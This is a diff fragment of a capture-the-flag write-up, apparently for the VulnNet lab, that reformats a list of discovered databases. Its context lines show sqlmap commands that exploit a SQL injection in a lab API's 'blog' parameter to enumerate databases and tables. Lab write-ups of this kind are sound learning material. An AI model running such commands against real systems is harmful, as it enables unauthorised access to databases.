@@ -68,9 +68,9 @@ Bingoo, there is SQL vulnerability. I also want to check it with SqlMap tool.
 sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" -p blog --dbs
 ```
 We already knew that the vulnerability was on "blog" parameter. So, I specially mentioned it on the command. There was three databases:
-[*] blog
-[*] information_schema
-[*] vn_admin
+- blog
+- information_schema
+- vn_admin  
 We need to check "vn_admin" at first:
 ```bash
 sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" -p blog -D vn_admin --tables
